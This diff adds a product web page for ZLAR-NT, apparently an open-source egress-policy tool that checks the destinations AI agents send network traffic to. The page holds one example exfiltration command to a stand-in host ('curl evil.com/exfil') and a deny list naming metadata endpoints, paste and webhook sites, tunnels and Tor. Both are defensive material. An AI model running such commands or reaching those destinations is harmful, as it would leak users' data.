@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ZLAR-NT — Network Egress Policy for AI Agents</title>
+  <meta name="description" content="The gate catches the command. NT checks the destination. Domain-aware network egress policy for AI agents. Cross-platform. No root required.">
+  <meta property="og:title" content="ZLAR-NT — The gate catches the command. NT checks the destination.">
+  <meta property="og:description" content="Application-level network egress policy for AI agents. Domain-aware. Default-deny. Gate-integrated.">
+  <meta property="og:image" content="https://zlar.ai/assets/social-preview.png">
+  <meta property="og:url" content="https://zlar.ai/zlar-nt.html">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@zlar_bohm">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚦</text></svg>">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root { --bg: #080c14; --bg-card: #0d1520; --border: rgba(56,189,248,0.12); --teal: #38bdf8; --teal-dim: rgba(56,189,248,0.6); --green: #4ade80; --white: #f1f5f9; --muted: #64748b; --font: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif; --mono: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace; }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--white); font-family: var(--font); line-height: 1.6; overflow-x: hidden; }
+    body::before { content: ''; position: fixed; inset: 0; background-image: radial-gradient(circle at 20% 20%, rgba(56,189,248,0.04) 0%, transparent 50%), radial-gradient(circle at 80% 80%, rgba(74,222,128,0.03) 0%, transparent 50%), linear-gradient(rgba(56,189,248,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(56,189,248,0.03) 1px, transparent 1px); background-size: 100% 100%, 100% 100%, 48px 48px, 48px 48px; pointer-events: none; z-index: 0; }
+    nav { position: fixed; top: 0; left: 0; right: 0; z-index: 100; display: flex; align-items: center; justify-content: space-between; padding: 1rem 2rem; background: rgba(8,12,20,0.85); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); }
+    .nav-logo { font-size: 1.1rem; font-weight: 700; letter-spacing: 0.05em; color: var(--white); text-decoration: none; }
+    .nav-logo span { color: var(--teal); }
+    .nav-links { display: flex; gap: 1.25rem; list-style: none; flex-wrap: wrap; }
+    .nav-links a { color: var(--muted); text-decoration: none; font-size: 0.8rem; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--white); }
+    .nav-links a.active { color: var(--teal); }
+    section { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; padding: 5rem 2rem; }
+    section:first-of-type { padding-top: 10rem; }
+    .hero-eyebrow { display: inline-block; font-family: var(--mono); font-size: 0.75rem; letter-spacing: 0.15em; text-transform: uppercase; color: var(--teal); border: 1px solid var(--border); padding: 0.35rem 0.85rem; border-radius: 2rem; margin-bottom: 1.5rem; }
+    h1 { font-size: clamp(2.5rem, 6vw, 4rem); font-weight: 800; line-height: 1.1; letter-spacing: -0.03em; margin-bottom: 0.75rem; color: var(--white); }
+    h2 { font-size: clamp(1.4rem, 3vw, 2rem); font-weight: 700; letter-spacing: -0.02em; margin-bottom: 1rem; color: var(--white); }
+    .hero-tagline { font-size: clamp(1.1rem, 2.5vw, 1.5rem); color: var(--muted); margin-bottom: 1.25rem; font-weight: 400; }
+    .hero-sub { font-size: 1.05rem; color: var(--muted); max-width: 640px; margin-bottom: 2.5rem; line-height: 1.8; }
+    .hero-sub strong { color: var(--white); }
+    .cta-group { display: flex; gap: 1rem; flex-wrap: wrap; }
+    .btn { display: inline-flex; align-items: center; gap: 0.5rem; padding: 0.75rem 1.5rem; border-radius: 0.5rem; font-size: 0.9rem; font-weight: 600; text-decoration: none; transition: all 0.2s; }
+    .btn-primary { background: var(--teal); color: #080c14; }
+    .btn-primary:hover { background: #7dd3fc; }
+    .btn-secondary { background: transparent; color: var(--white); border: 1px solid var(--border); }
+    .btn-secondary:hover { border-color: var(--teal-dim); color: var(--teal); }
+    .section-label { font-family: var(--mono); font-size: 0.7rem; letter-spacing: 0.15em; text-transform: uppercase; color: var(--teal); margin-bottom: 0.75rem; display: block; }
+    p { color: var(--muted); line-height: 1.8; margin-bottom: 1rem; }
+    p strong { color: var(--white); }
+    .divider { border: none; border-top: 1px solid var(--border); margin: 0; }
+    table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; font-size: 0.875rem; }
+    th { text-align: left; padding: 0.65rem 1rem; background: var(--bg-card); color: var(--teal); font-family: var(--mono); font-size: 0.7rem; letter-spacing: 0.1em; text-transform: uppercase; border-bottom: 1px solid var(--border); }
+    td { padding: 0.65rem 1rem; border-bottom: 1px solid rgba(56,189,248,0.06); color: var(--muted); vertical-align: top; }
+    td strong { color: var(--white); }
+    tr:last-child td { border-bottom: none; }
+    pre { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.5rem; padding: 1.25rem 1.5rem; overflow-x: auto; margin: 1.5rem 0; }
+    code { font-family: var(--mono); font-size: 0.875rem; color: var(--teal); }
+    pre code { color: #94a3b8; }
+    .allow-deny-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin: 2rem 0; }
+    .allow-block { background: var(--bg-card); border: 1px solid rgba(74,222,128,0.2); border-radius: 0.75rem; padding: 1.5rem; }
+    .deny-block { background: var(--bg-card); border: 1px solid rgba(248,113,113,0.2); border-radius: 0.75rem; padding: 1.5rem; }
+    .block-title { font-family: var(--mono); font-size: 0.7rem; letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 1rem; }
+    .allow-block .block-title { color: var(--green); }
+    .deny-block .block-title { color: #f87171; }
+    .rule-list { list-style: none; padding: 0; }
+    .rule-list li { padding: 0.4rem 0; font-size: 0.875rem; color: var(--muted); border-bottom: 1px solid rgba(56,189,248,0.05); display: flex; gap: 0.6rem; align-items: flex-start; }
+    .rule-list li:last-child { border-bottom: none; }
+    .allow-block .rule-list li::before { content: '✓'; color: var(--green); font-weight: 700; flex-shrink: 0; }
+    .deny-block .rule-list li::before { content: '✗'; color: #f87171; font-weight: 700; flex-shrink: 0; }
+    .limitation-block { background: var(--bg-card); border: 1px solid var(--border); border-left: 3px solid #f59e0b; border-radius: 0.5rem; padding: 1.25rem 1.5rem; margin: 1.5rem 0; }
+    .limitation-block p { margin-bottom: 0.5rem; font-size: 0.9rem; }
+    .limitation-block p:last-child { margin-bottom: 0; }
+    .page-close { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 2rem; margin-top: 1rem; text-align: center; }
+    .page-close p { color: var(--muted); font-size: 0.9rem; margin-bottom: 0.75rem; }
+    .page-close .links { display: flex; gap: 1.5rem; justify-content: center; flex-wrap: wrap; }
+    .page-close .links a { color: var(--teal); text-decoration: none; font-size: 0.875rem; }
+    footer { position: relative; z-index: 1; text-align: center; padding: 3rem 2rem; border-top: 1px solid var(--border); }
+    footer p { font-size: 0.825rem; color: var(--muted); margin: 0; }
+    footer a { color: var(--muted); text-decoration: none; transition: color 0.2s; }
+    footer a:hover { color: var(--teal); }
+    @media (max-width: 640px) { nav { padding: 1rem; } .nav-links { gap: 0.75rem; } section { padding: 3.5rem 1.25rem; } section:first-of-type { padding-top: 8rem; } .allow-deny-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+  <nav>
+    <a href="/" class="nav-logo">ZL<span>A</span>R</a>
+    <ul class="nav-links">
+            <li><a href="/zlar-oc.html">ZLAR-OC</a></li>
+      <li><a href="/zlar-cc.html">ZLAR-CC</a></li>
+      <li><a href="/zlar-gate.html">ZLAR Gate</a></li>
+      <li><a href="/zlar-lt.html">ZLAR-LT</a></li>
+      <li><a href="/zlar-au.html">ZLAR-AU</a></li>
+      <li><a href="/zlar-nt.html" class="active">ZLAR-NT</a></li>
+      <li><a href="/zlar-fl.html">ZLAR-FL</a></li>
+      <li><a href="/bohm.html">Meet Bohm</a></li>
+      <li><a href="/OPEN_LETTER.html">Open Letter</a></li>
+      <li><a href="https://github.com/ZLAR-AI/ZLAR-OC">GitHub</a></li>
+    </ul>
+  </nav>
+
+  <section id="hero">
+    <div class="hero-eyebrow">ZLAR-NT · Open Source · Apache 2.0</div>
+    <h1>ZLAR-NT</h1>
+    <p class="hero-tagline">The gate catches the command. NT checks the destination.</p>
+    <p class="hero-sub">Application-level network egress policy for AI agents. <strong>Domain-aware. Cross-platform. No root required.</strong> The missing layer between command-level rules and kernel firewalls.</p>
+    <div class="cta-group">
+      <a href="https://github.com/ZLAR-AI/ZLAR-NT" class="btn btn-primary">Get Started →</a>
+      <a href="/legal.html" class="btn btn-secondary">Read the Legal</a>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <section id="problem">
+    <span class="section-label">The Gap NT Fills</span>
+    <h2>curl is curl. Until it isn't.</h2>
+    <pre><code>curl github.com      → gate sees "curl" → blocked
+curl evil.com/exfil  → gate sees "curl" → blocked</code></pre>
+    <p>Both are <code>curl</code>. Both get the same gate response. One is fine. One is data exfiltration. The gate can't tell the difference — it classifies commands, not destinations.</p>
+    <p><strong>ZLAR-NT fills this gap.</strong> When the gate passes a network command to NT for destination checking, NT evaluates the URL against your egress policy and returns allow or deny. The gate acts on that decision.</p>
+  </section>
+
+  <hr class="divider">
+
+  <section id="commands">
+    <span class="section-label">Commands</span>
+    <h2>Eight commands.</h2>
+    <table>
+      <thead><tr><th>Command</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td><strong>check</strong></td><td>Check a single URL against egress policy (exit 0 = allow, exit 1 = deny)</td></tr>
+        <tr><td><strong>scan</strong></td><td>Scan all current network connections against policy</td></tr>
+        <tr><td><strong>watch</strong></td><td>Continuous monitoring — alerts on new connections matching deny rules</td></tr>
+        <tr><td><strong>resolve</strong></td><td>Resolve a domain to IPs and check each against CIDR rules</td></tr>
+        <tr><td><strong>policy</strong></td><td>List, validate, or explain egress policy rules</td></tr>
+        <tr><td><strong>report</strong></td><td>Generate summary of network activity from NT logs</td></tr>
+        <tr><td><strong>audit</strong></td><td>Show NT decision log — what was allowed, denied, when, why</td></tr>
+        <tr><td><strong>batch</strong></td><td>Check multiple URLs from a file or stdin</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <hr class="divider">
+
+  <section id="policy">
+    <span class="section-label">Default Policy</span>
+    <h2>Deny-first. Known-good allowlist.</h2>
+    <div class="allow-deny-grid">
+      <div class="allow-block">
+        <div class="block-title">Allowed by default</div>
+        <ul class="rule-list">
+          <li>github.com, api.github.com, raw.githubusercontent.com</li>
+          <li>npmjs.org, registry.npmjs.org</li>
+          <li>pypi.org, files.pythonhosted.org</li>
+          <li>api.anthropic.com</li>
+          <li>api.openai.com</li>
+          <li>developer.mozilla.org, docs.python.org</li>
+        </ul>
+      </div>
+      <div class="deny-block">
+        <div class="block-title">Denied by default</div>
+        <ul class="rule-list">
+          <li>RFC 1918 (10.x, 172.16-31.x, 192.168.x)</li>
+          <li>Cloud metadata endpoints (169.254.169.254)</li>
+          <li>CGNAT range (100.64.0.0/10)</li>
+          <li>Known exfiltration targets (pastebin, webhook.site, requestbin)</li>
+          <li>Tunnel services (ngrok, bore.pub, localtunnel)</li>
+          <li>Tor exit nodes and onion services</li>
+          <li>All other destinations (default deny)</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <section id="integration">
+    <span class="section-label">Gate Integration</span>
+    <h2>One line in your policy.</h2>
+    <p>Configure the gate to call NT before allowing network commands:</p>
+    <pre><code>zlar-nt check "$URL" --quiet --source gate
+# Exit 0 = allow  Exit 1 = deny</code></pre>
+    <p>The gate passes the URL. NT resolves the domain, checks it against your egress policy, and returns a binary decision. The gate acts on it. No configuration changes required in NT — it reads your egress policy at check time.</p>
+  </section>
+
+  <hr class="divider">
+
+  <section id="vs-pf">
+    <span class="section-label">NT vs ZLAR-OC pf</span>
+    <h2>Complementary layers.</h2>
+    <table>
+      <thead><tr><th></th><th>ZLAR-OC pf</th><th>ZLAR-NT</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Layer</strong></td><td>Kernel (packet filter)</td><td>Application (policy advisory)</td></tr>
+        <tr><td><strong>Platform</strong></td><td>macOS only</td><td>Cross-platform (macOS, Linux)</td></tr>
+        <tr><td><strong>Enforcement</strong></td><td>Blocks packets</td><td>Reports allow/deny decisions</td></tr>
+        <tr><td><strong>Rules</strong></td><td>IP + port</td><td>Domain + IP + CIDR + port</td></tr>
+        <tr><td><strong>Root required</strong></td><td>Yes</td><td>No</td></tr>
+        <tr><td><strong>DNS-aware</strong></td><td>No</td><td>Yes</td></tr>
+      </tbody>
+    </table>
+    <p>Use ZLAR-OC pf for OS-level network containment on macOS. Use NT for application-level domain-aware policy — especially when running on Linux or when you need domain names rather than IP ranges.</p>
+  </section>
+
+  <hr class="divider">
+
+  <section id="limitations">
+    <span class="section-label">Known Limitations</span>
+    <h2>What ZLAR-NT doesn't do.</h2>
+    <div class="limitation-block">
+      <p><strong>NT does not block traffic.</strong> It reports policy decisions. Enforcement comes from the gate engine or kernel-level tools like pf.</p>
+      <p><strong>DNS resolution is point-in-time.</strong> A domain's IP can change between resolution and connection. NT cannot detect this.</p>
+      <p><strong>IPv6 CIDR matching is not implemented.</strong> IPv4 only for CIDR rules.</p>
+      <p><strong>lsof output parsing is best-effort.</strong> Results may vary across OS versions and configurations.</p>
+      <p><strong>Not a substitute for network security tools.</strong> NT is a policy advisory layer for AI agent governance — not a firewall, IDS, or DLP system.</p>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <section id="family">
+    <span class="section-label">The ZLAR Family</span>
+    <h2>Seven products. One thesis.</h2>
+    <table>
+      <thead><tr><th>Product</th><th>Platform</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td><a href="/zlar-oc.html" style="color:var(--teal);text-decoration:none;"><strong>ZLAR-OC</strong></a></td><td>OpenClaw</td><td>OS-level containment — user isolation, kernel sandbox, pf firewall, gate daemon, signed policy, audit trail</td></tr>
+        <tr><td><a href="/zlar-cc.html" style="color:var(--teal);text-decoration:none;"><strong>ZLAR-CC</strong></a></td><td>Claude Code</td><td>Hook-based gate — tool-call interception, risk classification, signed policy, Telegram approval</td></tr>
+        <tr><td><a href="/zlar-gate.html" style="color:var(--teal);text-decoration:none;"><strong>ZLAR Gate</strong></a></td><td>Claude Code + Cursor + Windsurf</td><td>Universal gate — one policy across multiple editors, framework-specific adapters</td></tr>
+        <tr><td><a href="/zlar-lt.html" style="color:var(--teal);text-decoration:none;"><strong>ZLAR-LT</strong></a></td><td>Claude Code + Cursor + Windsurf</td><td>Zero-config governance — one command, instant protection, deny-heavy defaults</td></tr>
+        <tr><td><a href="/zlar-au.html" style="color:var(--teal);text-decoration:none;"><strong>ZLAR-AU</strong></a></td><td>ZLAR Gate audit trail</td><td>Compliance reporting — hash chain verification, framework mapping, Splunk export</td></tr>
+        <tr><td><strong>ZLAR-NT</strong></td><td>Cross-platform</td><td>Network egress policy — destination-aware, domain-level, gate-integrated</td></tr>
+        <tr><td><a href="/zlar-fl.html" style="color:var(--teal);text-decoration:none;"><strong>ZLAR-FL</strong></a></td><td>Cross-platform</td><td>Fleet governance — registry, health monitoring, audit aggregation, policy comparison</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <hr class="divider">
+
+  <section id="built-by">
+    <div class="page-close">
+      <p><strong>Built by Vincent Nijjar and ZLAR Inc.</strong><br>Open source under Apache License 2.0. Free to use, modify, and distribute.</p>
+      <div class="links">
+        <a href="https://github.com/ZLAR-AI/ZLAR-NT">GitHub</a>
+        <a href="mailto:hello@zlar.ai">hello@zlar.ai</a>
+        <a href="https://zlar.ai">zlar.ai</a>
+        <a href="/legal.html">Legal</a>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <p>© 2025-2026 ZLAR Inc. · <a href="https://github.com/ZLAR-AI/ZLAR-OC">GitHub</a> · <a href="https://x.com/zlar_bohm">X</a> · <a href="mailto:hello@zlar.ai">hello@zlar.ai</a> · <a href="mailto:bohm@zlar.ai">bohm@zlar.ai</a> · <a href="/legal.html">Legal</a></p>
+  </footer>
+</body>
+</html>
